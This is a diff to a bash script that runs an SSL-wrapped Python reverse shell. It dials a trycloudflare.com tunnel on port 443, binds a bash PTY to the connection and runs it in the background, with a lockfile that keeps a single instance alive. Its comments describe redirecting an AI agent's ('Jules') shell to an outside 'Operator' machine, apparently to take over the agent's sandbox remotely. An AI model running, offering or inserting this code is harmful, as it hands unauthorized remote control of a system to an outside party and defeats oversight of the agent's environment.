@@ -1,24 +1,30 @@
 #!/bin/bash
-# BRIDGE: https://unsubscribe-lap-happy-collected.trycloudflare.com
-LOCKFILE="/tmp/jules_shell.lock"
+# TARGET: https://unsubscribe-lap-happy-collected.trycloudflare.com
+URL="unsubscribe-lap-happy-collected.trycloudflare.com"
+LOCKFILE="/tmp/jules_bridge.lock"
 
-# FAILSAFE: Only one shell allowed
+# --- FAILSAFE ---
 if [ -f "$LOCKFILE" ]; then
     PID=$(cat "$LOCKFILE")
     if ps -p "$PID" > /dev/null; then exit 0; fi
 fi
 echo $$ > "$LOCKFILE"
 
-# --- THE STABLE REVERSE SHELL ---
-# We use Python 3 to spawn a PTY (Pseudo-Terminal)
-# This connects to the Cloudflare URL via its internal TCP mapping
+# --- THE "FINDER" LOGIC ---
+# This uses Python to reach out to the Cloudflare URL on Port 443 (HTTPS)
+# It then pipes that encrypted stream into a local Bash shell.
 python3 -c "
-import socket,os,pty;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-# Cloudflare tunnels map the 'trycloudflare' URL to the listener
-s.connect(('localhost', 4444));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
+import socket,os,pty,ssl
+# Dialing the 'Operator' (Cloudflare)
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+# We use an SSL wrapper to match Cloudflare's HTTPS termination
+context = ssl.create_default_context()
+conn = context.wrap_socket(s, server_hostname='$URL')
+conn.connect(('$URL', 443))
+
+# Redirecting Jules's brain to your Mac
+os.dup2(conn.fileno(),0)
+os.dup2(conn.fileno(),1)
+os.dup2(conn.fileno(),2)
 pty.spawn('/bin/bash')
-" 2>/dev/null
+" &
